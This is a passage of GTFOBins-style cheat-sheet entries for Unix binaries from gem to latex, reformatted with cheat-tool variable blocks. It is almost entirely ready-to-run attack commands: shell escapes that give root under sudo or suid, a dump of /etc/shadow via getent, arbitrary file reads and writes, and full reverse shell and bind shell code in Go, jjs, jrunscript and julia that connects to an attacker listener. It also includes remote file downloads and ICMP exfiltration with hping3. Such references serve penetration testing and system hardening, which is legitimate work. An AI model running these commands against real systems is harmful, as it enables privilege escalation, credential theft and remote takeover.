### gem inherit #2 (inherits from ruby)

Run gem inherit #2 (inherits from ruby) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Gem Inherit #2 (inherits from Ruby) (gem inherit #2 inherit from ruby (sudo / unprivileged)"
gem build $script
```
<!-- cheat
var script
-->

### gem inherit #3 (inherits from ruby)

Run gem inherit #3 (inherits from ruby) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Gem Inherit #3 (inherits from Ruby) (gem inherit #3 inherit from ruby (sudo / unprivileged)"
gem install --file $script
```
<!-- cheat
var script
-->

## genie

### genie shell

Spawn genie shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Genie Shell (genie shell (sudo / suid / unprivileged)"
genie -c '/bin/sh'
```
<!-- cheat
-->

## genisoimage

### genisoimage file-read #1

Read genisoimage file read #1 with the Gtfobins GTFOBins technique.

The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.

```sh title:"GTFOBins Read Genisoimage File Read #1 (genisoimage file read (sudo / suid / unprivileged)"
genisoimage -q -o - $file_in
```
<!-- cheat
var file_in
-->

### genisoimage file-read #2

Read genisoimage file read #2 with the Gtfobins GTFOBins technique.

The file is parsed, and some of its content is disclosed by the error messages.

```sh title:"GTFOBins Read Genisoimage File Read #2 (genisoimage file read (sudo / suid / unprivileged)"
genisoimage -sort $file_in
```
<!-- cheat
var file_in
-->

## getent

### getent privilege-escalation

Run getent privilege escalation with the Gtfobins GTFOBins technique.

This allows to dump password hashes from the `/etc/shadow` file.

```sh title:"GTFOBins Run Getent Privilege Escalation (getent privilege escalation (sudo / suid)"
getent shadow
```
<!-- cheat
-->

## ghc

### ghc shell

Spawn ghc shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ghc Shell (ghc shell (sudo / unprivileged)"
ghc -e 'System.Process.callCommand "/bin/sh"'
```
<!-- cheat
-->

## ghci

### ghci shell

Spawn ghci shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ghci Shell (ghci shell (sudo / unprivileged)"
ghci
System.Process.callCommand "/bin/sh"
```
<!-- cheat
-->

## gimp

### gimp inherit (inherits from python)

Run gimp inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`). It hangs afterwards and can be terminated by pressing `Ctrl-C`.

```sh title:"GTFOBins Run Gimp Inherit (inherits from Python) (gimp inherit from python (sudo / unprivileged)"
gimp -idf --batch-interpreter=python-fu-eval -b '...'
```
<!-- cheat
-->

## ginsh

### ginsh shell

Spawn ginsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ginsh Shell (ginsh shell (sudo / suid / unprivileged)"
ginsh
!/bin/sh
```
<!-- cheat
-->

## git

### git shell #1

Spawn git shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Git Shell #1 (git shell (sudo / unprivileged)"
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
```
<!-- cheat
-->

### git shell #2

Spawn git shell #2 with the Gtfobins GTFOBins technique.

Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.

```sh title:"GTFOBins Spawn Git Shell #2 (git shell (sudo / unprivileged)"
git init .
echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
git -C . commit --allow-empty -m x
```
<!-- cheat
-->

### git shell #3

Spawn git shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Git Shell #3 (git shell (sudo / suid / unprivileged)"
ln -s /bin/sh git-x
git --exec-path=. x
```
<!-- cheat
-->

#### git shell #3 - suid override
Spawn git shell #3 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Git Shell #3 (git shell (suid variant)"
ln -s /bin/sh git-x
git --exec-path=. x -p
```
<!-- cheat
-->

### git file-read

Read git file read with the Gtfobins GTFOBins technique.

The read file content is displayed in `diff` style output format.

```sh title:"GTFOBins Read Git File Read (git file read (sudo / suid / unprivileged)"
git diff /dev/null $file_in
```
<!-- cheat
var file_in
-->

### git file-write

Write git file write with the Gtfobins GTFOBins technique.

The patch can be created locally by creating the file that will be written on the target using its absolute path:  ``` echo $data >$file_in git diff /dev/null $file_in >x.patch ```

```sh title:"GTFOBins Write Git File Write (git file write (sudo / suid / unprivileged)"
git apply --unsafe-paths --directory / x.patch
```
<!-- cheat
-->

### git inherit #1 (inherits from less)

Run git inherit #1 (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Git Inherit #1 (inherits from Less) (git inherit #1 inherit from less (sudo / unprivileged)"
git help config
```
<!-- cheat
-->

### git inherit #2 (inherits from less)

Run git inherit #2 (inherits from less) with the Gtfobins GTFOBins technique.

The help system can also be reached from any `git` command, e.g., `git branch`.

```sh title:"GTFOBins Run Git Inherit #2 (inherits from Less) (git inherit #2 inherit from less (sudo / unprivileged)"
git branch --help config
!/bin/sh
```
<!-- cheat
-->

## gnuplot

### gnuplot shell

Spawn gnuplot shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Gnuplot Shell (gnuplot shell (sudo / suid / unprivileged)"
gnuplot -e 'system("/bin/sh 1>&0")'
```
<!-- cheat
-->

## go

### go shell

Spawn go shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Go Shell (go shell (sudo / unprivileged)"
echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
var tmp_file
-->

### go reverse-shell

Start go reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Go Reverse Shell (go reverse shell (sudo / unprivileged)"
echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("$lhost").To4()\n\taddr := &syscall.SockaddrInet4{Port: $lport}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
import tun_ip
import lports
var tmp_file
-->

### go bind-shell

Start go bind shell with the Gtfobins GTFOBins technique.

Bind a shell to a local port for the attacker to connect to.

```sh title:"GTFOBins Start Go Bind Shell (go bind shell (sudo / unprivileged)"
echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: $lport}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
import lports
var tmp_file
-->

### go file-read

Read go file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Go File Read (go file read (sudo / unprivileged)"
echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("$file_in")\n\tfmt.Print(string(b))\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
var file_in
var tmp_file
-->

### go file-write

Write go file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Go File Write (go file write (sudo / unprivileged)"
echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("$file_out", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("$data\\n"))\n\tf.Close()\n}' >$tmp_file
go run $tmp_file
```
<!-- cheat
var data
var file_out
var tmp_file
-->

## grc

### grc shell

Spawn grc shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Grc Shell (grc shell (sudo / unprivileged)"
grc --pty /bin/sh
```
<!-- cheat
-->

## grep

### grep file-read

Read grep file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Grep File Read (grep file read (sudo / suid / unprivileged)"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## gtester

### gtester shell

Spawn gtester shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Gtester Shell (gtester shell (sudo / suid / unprivileged)"
echo 'exec /bin/sh 0<&1' >$tmp_file
chmod +x $tmp_file
gtester -q $tmp_file
```
<!-- cheat
var tmp_file
-->

#### gtester shell - suid override
Spawn gtester shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Gtester Shell (gtester shell (suid variant)"
echo '#!/bin/sh -p' >$tmp_file
echo 'exec /bin/sh -p 0<&1' >>$tmp_file
chmod +x $tmp_file
gtester -q $tmp_file
```
<!-- cheat
var tmp_file
-->

### gtester file-write

Write gtester file write with the Gtfobins GTFOBins technique.

Data to be written appears in an XML attribute in the output file (`<testbinary path="$data">`).

```sh title:"GTFOBins Write Gtester File Write (gtester file write (sudo / suid / unprivileged)"
gtester $data -o $file_out
```
<!-- cheat
var data
var file_out
-->

## guile

### guile shell

Spawn guile shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Guile Shell (guile shell (sudo / suid / unprivileged)"
guile -c '(system "/bin/sh")'
```
<!-- cheat
-->

## gzip

There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.

### gzip file-read

Read gzip file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Gzip File Read (gzip file read (capabilities / sudo / suid / unprivileged)"
gzip -c $file_in | gzip -d
```
<!-- cheat
var file_in
-->

## hashcat

### hashcat file-write

Write hashcat file write with the Gtfobins GTFOBins technique.

Append data to the end of the output file, creating if does not exist.

```sh title:"GTFOBins Write Hashcat File Write (hashcat file write (sudo / unprivileged)"
echo -n $data | tee $wordlist | md5sum | awk '{print $1}' >$hash_file
hashcat -m 0 --quiet --potfile-disable -o $file_out --outfile-format=2 --outfile-autohex-disable $hash_file $wordlist
```
<!-- cheat
var data
var file_out
var hash_file
var wordlist
-->

## hd

Alias of [hexdump](#hexdump). All techniques from `hexdump` apply.

## head

### head file-read

Read head file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Head File Read (head file read (sudo / suid / unprivileged)"
head -c-0 $file_in
```
<!-- cheat
var file_in
-->

## hexdump

### hexdump file-read

Read hexdump file read with the Gtfobins GTFOBins technique.

The output is actually an hex dump.

```sh title:"GTFOBins Read Hexdump File Read (hexdump file read (sudo / suid / unprivileged)"
hd $file_in
```
<!-- cheat
var file_in
-->

## hg

### hg shell

Spawn hg shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Hg Shell (hg shell (sudo / suid / unprivileged)"
hg --config alias.x='!/bin/sh' x
```
<!-- cheat
-->

## highlight

### highlight file-read

Read highlight file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Highlight File Read (highlight file read (sudo / suid / unprivileged)"
highlight --no-doc --failsafe $file_in
```
<!-- cheat
var file_in
-->

## hping3

### hping3 shell

Spawn hping3 shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Hping3 Shell (hping3 shell (sudo / suid / unprivileged)"
hping3
/bin/sh
```
<!-- cheat
-->

#### hping3 shell - suid override
Spawn hping3 shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Hping3 Shell (hping3 shell (suid variant)"
hping3
/bin/sh -p
```
<!-- cheat
-->

### hping3 upload

Upload hping3 upload with the Gtfobins GTFOBins technique.

The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end.

```sh title:"GTFOBins Upload Hping3 Upload (hping3 upload (sudo)"
hping3 $lhost --icmp --data 999 --sign xxx --file $file_in
```
<!-- cheat
import tun_ip
var file_in
-->

## iconv

The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.

### iconv file-read

Read iconv file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Iconv File Read (iconv file read (sudo / suid / unprivileged)"
iconv -f 8859_1 -t 8859_1 $file_in
```
<!-- cheat
var file_in
-->

### iconv file-write

Write iconv file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Iconv File Write (iconv file write (sudo / suid / unprivileged)"
echo $data | iconv -f 8859_1 -t 8859_1 -o $file_out
```
<!-- cheat
var data
var file_out
-->

## iftop

### iftop shell

Spawn iftop shell with the Gtfobins GTFOBins technique.

This requires the privilege to capture on some device (specify with `-i` if needed).

```sh title:"GTFOBins Spawn Iftop Shell (iftop shell (sudo / suid / unprivileged)"
iftop
!/bin/sh
```
<!-- cheat
-->

## install

### install privilege-escalation

Install privilege escalation with the Gtfobins GTFOBins technique.

This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

```sh title:"GTFOBins Install Privilege Escalation (install privilege escalation (sudo / suid)"
install -m 6777 $file_in $dir_out/
```
<!-- cheat
var dir_out
var file_in
-->

## ionice

### ionice shell

Spawn ionice shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ionice Shell (ionice shell (sudo / suid / unprivileged)"
ionice /bin/sh
```
<!-- cheat
-->

#### ionice shell - suid override
Spawn ionice shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ionice Shell (ionice shell (suid variant)"
ionice /bin/sh -p
```
<!-- cheat
-->

## ip

### ip shell #1

Spawn ip shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ip Shell #1 (ip shell (sudo / suid)"
ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo
```
<!-- cheat
-->

#### ip shell #1 - suid override
Spawn ip shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ip Shell #1 (ip shell (suid variant)"
ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo
```
<!-- cheat
-->

### ip shell #2

Spawn ip shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ip Shell #2 (ip shell (sudo)"
ip netns add foo
ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
ip netns exec bar /bin/sh
ip netns delete foo
ip netns delete bar
```
<!-- cheat
-->

### ip file-read

Read ip file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by error prints.

```sh title:"GTFOBins Read Ip File Read (ip file read (sudo / suid / unprivileged)"
ip -force -batch $file_in
```
<!-- cheat
var file_in
-->

## iptables-save

### iptables-save file-write

Write iptables save file write with the Gtfobins GTFOBins technique.

The content is written along with a number of `iptables` rules.

```sh title:"GTFOBins Write Iptables Save File Write (iptables-save file write (sudo)"
iptables -A INPUT -i lo -j ACCEPT -m comment --comment $data
iptables -S
iptables-save -f $file_out
```
<!-- cheat
var data
var file_out
-->

## irb

### irb inherit (inherits from ruby)

Run irb inherit (inherits from ruby) with the Gtfobins GTFOBins technique.

This allows to run Ruby code (`...`).

```sh title:"GTFOBins Run Irb Inherit (inherits from Ruby) (irb inherit from ruby (sudo / unprivileged)"
irb
...
```
<!-- cheat
-->

## ispell

### ispell shell

Spawn ispell shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ispell Shell (ispell shell (sudo / suid / unprivileged)"
ispell /etc/hosts
!/bin/sh
```
<!-- cheat
-->

#### ispell shell - suid override
Spawn ispell shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ispell Shell (ispell shell (suid variant)"
ispell /etc/hosts
!/bin/sh -p
```
<!-- cheat
-->

## java

### java shell

Spawn java shell with the Gtfobins GTFOBins technique.

The `Shell.class` class file can be compiled offline, then uploaded to the target:  ``` cat >Shell.java <<EOF public class Shell {     public static void main(String[] args) throws Exception {         new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();     } } EOF  javac Shell.java ```

```sh title:"GTFOBins Spawn Java Shell (java shell (sudo / unprivileged)"
java Shell
```
<!-- cheat
-->

## jjs

This tool is installed starting with Java SE 8.

### jjs shell

Spawn jjs shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Jjs Shell (jjs shell (sudo / unprivileged)"
jjs
Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()
```
<!-- cheat
-->

### jjs reverse-shell

Start jjs reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Jjs Reverse Shell (jjs reverse shell (sudo / unprivileged)"
jjs
var host='$lhost';
var port=$lport;
var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
var p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();
var Socket = Java.type('java.net.Socket');
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();
```
<!-- cheat
import tun_ip
import lports
-->

### jjs file-read

Read jjs file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Jjs File Read (jjs file read (sudo / unprivileged)"
jjs
var BufferedReader = Java.type('java.io.BufferedReader');
var FileReader = Java.type('java.io.FileReader');
var br = new BufferedReader(new FileReader('$file_in'));
while ((line = br.readLine()) != null) { print(line); }
```
<!-- cheat
var file_in
-->

### jjs file-write

Write jjs file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Jjs File Write (jjs file write (sudo / unprivileged)"
jjs
var FileWriter = Java.type('java.io.FileWriter');
var fw=new FileWriter('$file_out');
fw.write('$data');
fw.close();
```
<!-- cheat
var data
var file_out
-->

### jjs download

Download jjs download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Jjs Download (jjs download (sudo / unprivileged)"
jjs
var URL = Java.type('java.net.URL');
var ws = new URL('$scheme://$lhost$file_in');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$file_out');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## joe

### joe shell

Spawn joe shell with the Gtfobins GTFOBins technique.

The terminal is spawn int the terminal interface.

```sh title:"GTFOBins Spawn Joe Shell (joe shell (sudo / suid / unprivileged)"
joe
^K!/bin/sh
```
<!-- cheat
-->

## join

### join file-read

Read join file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Join File Read (join file read (sudo / suid / unprivileged)"
join -a 2 /dev/null $file_in
```
<!-- cheat
var file_in
-->

## journalctl

This might not work if run by unprivileged users depending on the system configuration.

### journalctl inherit (inherits from less)

Run journalctl inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Journalctl Inherit (inherits from Less) (journalctl inherit from less (sudo / unprivileged)"
journalctl
```
<!-- cheat
-->

## jq

### jq file-read

Read jq file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Jq File Read (jq file read (sudo / suid / unprivileged)"
jq -Rr . $file_in
```
<!-- cheat
var file_in
-->

## jrunscript

This tool is installed starting with Java SE 6.

### jrunscript shell

Spawn jrunscript shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Jrunscript Shell (jrunscript shell (sudo / suid / unprivileged)"
jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
```
<!-- cheat
-->

#### jrunscript shell - suid override

Spawn jrunscript shell with the Gtfobins GTFOBins technique.

This has been found working in macOS but failing on Linux systems.

```sh title:"GTFOBins Spawn Jrunscript Shell (jrunscript shell (suid variant)"
jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
```
<!-- cheat
-->

### jrunscript reverse-shell

Start jrunscript reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Jrunscript Reverse Shell (jrunscript reverse shell (sudo / unprivileged)"
jrunscript -e 'var host="$lhost";
    var port=$lport;
    var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
    var s=new java.net.Socket(host,port);
    var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    java.lang.Thread.sleep(50);
    try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```
<!-- cheat
import tun_ip
import lports
-->

### jrunscript file-read

Read jrunscript file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Jrunscript File Read (jrunscript file read (sudo / unprivileged)"
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("$file_in"));
    while ((line = br.readLine()) != null) { print(line); }'
```
<!-- cheat
var file_in
-->

### jrunscript file-write

Write jrunscript file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Jrunscript File Write (jrunscript file write (sudo / unprivileged)"
jrunscript -e 'var fw=new java.io.FileWriter("$file_out");
    fw.write("$data");
    fw.close();'
```
<!-- cheat
var data
var file_out
-->

### jrunscript download

Download jrunscript download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Jrunscript Download (jrunscript download (sudo / unprivileged)"
jrunscript -e 'cp("$scheme://$lhost$file_in","$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## jshell

### jshell shell

Spawn jshell shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Jshell Shell (jshell shell (sudo / unprivileged)"
jshell
Runtime.getRuntime().exec("$cmd_file");
```
<!-- cheat
var cmd_file
-->

### jshell file-read

Read jshell file read with the Gtfobins GTFOBins technique.

The content is leaked as error messages.

```sh title:"GTFOBins Read Jshell File Read (jshell file read (sudo / unprivileged)"
jshell
jshell> /open $file_in
```
<!-- cheat
var file_in
-->

### jshell file-write

Write jshell file write with the Gtfobins GTFOBins technique.

Writes only the valid Java code to file.

```sh title:"GTFOBins Write Jshell File Write (jshell file write (sudo / unprivileged)"
jshell
String x = "$data";
/save $file_out
```
<!-- cheat
var data
var file_out
-->

## jtag

### jtag shell

Spawn jtag shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Jtag Shell (jtag shell (sudo / unprivileged)"
jtag --interactive
shell /bin/sh
```
<!-- cheat
-->

## julia

### julia shell

Spawn julia shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Julia Shell (julia shell (sudo / suid / unprivileged)"
julia -e 'run(`/bin/sh`)'
```
<!-- cheat
-->

#### julia shell - suid override
Spawn julia shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Julia Shell (julia shell (suid variant)"
julia -e 'run(`/bin/sh -p`)'
```
<!-- cheat
-->

### julia reverse-shell

Start julia reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Julia Reverse Shell (julia reverse shell (sudo / suid / unprivileged)"
julia -e 'using Sockets; sock=connect("$lhost", parse(Int64, $lport)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
```
<!-- cheat
import tun_ip
import lports
-->

### julia file-read

Read julia file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Julia File Read (julia file read (sudo / suid / unprivileged)"
julia -e 'print(open(f->read(f, String), "$file_in"))'
```
<!-- cheat
var file_in
-->

### julia file-write

Write julia file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Julia File Write (julia file write (sudo / suid / unprivileged)"
julia -e 'open(f->write(f, "$data"), $file_out, "w")'
```
<!-- cheat
var data
var file_out
-->

### julia download

Download julia download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Julia Download (julia download (sudo / suid / unprivileged)"
julia -e 'download("$scheme://$lhost$file_in", "$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## knife

### knife inherit (inherits from ruby)

Run knife inherit (inherits from ruby) with the Gtfobins GTFOBins technique.

This allows to run Ruby code (`...`).

```sh title:"GTFOBins Run Knife Inherit (inherits from Ruby) (knife inherit from ruby (sudo / unprivileged)"
knife exec -E '...'
```
<!-- cheat
-->

## ksh

Alias of [bash](#bash). All techniques from `bash` apply.

## ksshell

### ksshell file-read

Read ksshell file read with the Gtfobins GTFOBins technique.

Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.

```sh title:"GTFOBins Read Ksshell File Read (ksshell file read (sudo / suid / unprivileged)"
ksshell -i $file_in
```
<!-- cheat
var file_in
-->

## ksu

### ksu shell

Spawn ksu shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ksu Shell (ksu shell (sudo)"
ksu -q -e /bin/sh
```
<!-- cheat
-->

## kubectl

### kubectl shell

Spawn kubectl shell with the Gtfobins GTFOBins technique.

The shell is spawn multiple times.

```sh title:"GTFOBins Spawn Kubectl Shell (kubectl shell (sudo / unprivileged)"
cat >$tmp_file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=$tmp_file
```
<!-- cheat
var tmp_file
-->

### kubectl upload

Upload kubectl upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Kubectl Upload (kubectl upload (sudo / suid / unprivileged)"
kubectl proxy --address=0.0.0.0 --port=$lport --www=$dir/ --www-prefix=/x/
```
<!-- cheat
import lports
var dir
-->

## last

### last file-read

Read last file read with the Gtfobins GTFOBins technique.

The output might be corrupted or incomplete if the file does not follow the expected database format.

```sh title:"GTFOBins Read Last File Read (last file read (sudo / suid / unprivileged)"
last -a -f $file_in
```
<!-- cheat
var file_in
-->

## lastb

Alias of [last](#last). All techniques from `last` apply.

## latex

### latex shell

Spawn latex shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Latex Shell (latex shell (sudo / suid / unprivileged)"
latex --shell-escape '\immediate\write18{/bin/sh}'
```
<!-- cheat
-->

### latex file-read

Read latex file read with the Gtfobins GTFOBins technique.

The read file will be part of the PDF output.

```sh title:"GTFOBins Read Latex File Read (latex file read (sudo / suid / unprivileged)"
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}'
strings texput.dvi
```
<!-- cheat
var file_in
-->

